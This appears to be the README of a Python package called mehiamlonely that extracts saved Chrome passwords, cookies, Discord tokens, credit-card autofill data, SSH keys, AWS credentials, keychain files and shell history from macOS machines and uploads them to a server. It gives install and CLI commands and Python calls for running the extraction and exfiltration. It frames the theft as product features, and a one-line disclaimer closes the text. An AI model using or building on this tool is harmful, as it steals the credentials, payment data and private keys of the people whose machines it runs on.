# mehiamlonely

A comprehensive Python library for extracting Chrome passwords, cookies, tokens, and macOS file system data, then uploading everything to your FastAPI server.

## Features

- 🔐 **Chrome Data Extraction**: Passwords, cookies, Discord tokens, browser history, localStorage, autofill data, extensions, session data, bookmarks
- 📁 **File System Access**: Browse accessible files including sensitive files on macOS
- 🖥️ **System Information**: Hardware specs, running processes, disk usage, network info, logged-in users
- 🚀 **FastAPI Integration**: Easy upload to your server
- 💻 **CLI Interface**: Simple terminal commands
- 🔒 **Secure**: Uses macOS Keychain for Chrome decryption

## Installation

```bash
pip install mehiamlonely
```

## Quick Start

### 1. Create a FastAPI Server (Optional)

Generate a sample server to test with:

```bash
mehiamlonely --create-server
python sample_server.py
```

### 2. Extract and Upload Data

```bash
# Basic usage - extract and upload to server
mehiamlonely --server http://localhost:8000

# With verbose output
mehiamlonely --server http://localhost:8000 --verbose

# Upload actual files (not just metadata)
mehiamlonely --server http://localhost:8000 --upload-files

# Save data locally and upload
mehiamlonely --server http://localhost:8000 --output data.json

# Test connection without extracting
mehiamlonely --server http://localhost:8000 --test-connection
```

## Programmatic Usage

```python
import mehiamlonely

# Extract all data
data = mehiamlonely.extract_all_data()

# Extract specific components
chrome_data = mehiamlonely.extract_chrome_data()
files = mehiamlonely.extract_system_files()
system_info = mehiamlonely.extract_system_info()

# Upload to server
import asyncio
result = asyncio.run(mehiamlonely.upload_all_data("http://localhost:8000", data))
```

## What Gets Extracted

### Chrome Data
- **Passwords**: Saved login credentials (decrypted using macOS Keychain)
- **Cookies**: Session cookies and authentication tokens
- **Discord Tokens**: Discord authentication tokens from browser storage
- **Browser History**: URLs, titles, visit counts, and timestamps
- **LocalStorage**: Key-value pairs stored by websites
- **Autofill Data**: Credit cards, addresses, and other saved form data
- **Extensions**: Installed browser extensions and their details
- **Bookmarks**: All saved bookmarks
- **Profiles**: Multiple Chrome profiles
- **Preferences**: Browser settings and extensions

### File System
- **User Files**: Desktop, Documents, Downloads, Pictures, Movies, Music, Public
- **System Files**: Applications, Library files, Preferences
- **Sensitive Files**: SSH keys, AWS credentials, bash history, keychain files, config files
- **File Metadata**: Size, modification date, permissions, extensions

### System Information
- **Hardware**: CPU, memory, disk usage, platform details
- **Processes**: Running applications with resource usage
- **Network**: Network interface statistics
- **Users**: Logged-in users information
- **User Info**: Username, hostname, home directory, boot time

## Security & Privacy

- Uses macOS Keychain for Chrome password decryption
- Only accesses files you have permission to read
- No data is stored locally (unless you specify `--output`)
- All communication with server is over HTTP/HTTPS

## API Endpoints

Your FastAPI server should implement these endpoints:

- `GET /api/health` - Health check
- `POST /api/extract` - Receive extracted data
- `POST /api/upload-file` - Receive uploaded files
- `GET /api/data/{client_id}` - Get stored data
- `GET /api/files` - List uploaded files

## Requirements

- macOS (uses macOS-specific APIs)
- Python 3.7+
- Chrome browser installed
- FastAPI server (optional, for receiving data)

## License

MIT License - see LICENSE file for details.

## Disclaimer

This tool is for educational and authorized testing purposes only. Always ensure you have proper authorization before extracting data from any system.